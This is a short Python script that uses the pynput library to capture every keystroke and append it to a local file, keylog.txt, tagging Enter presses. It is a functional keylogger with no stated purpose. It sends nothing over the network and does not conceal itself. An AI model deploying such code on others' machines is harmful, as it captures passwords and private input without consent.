from pynput.keyboard import Key, Listener

def on_press(key):
    with open('keylog.txt', 'a') as f:
        f.write(str(key))
        if key == Key.enter:
            f.write(' (Enter)')
        f.write('\n')

def on_release(key):
    pass

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()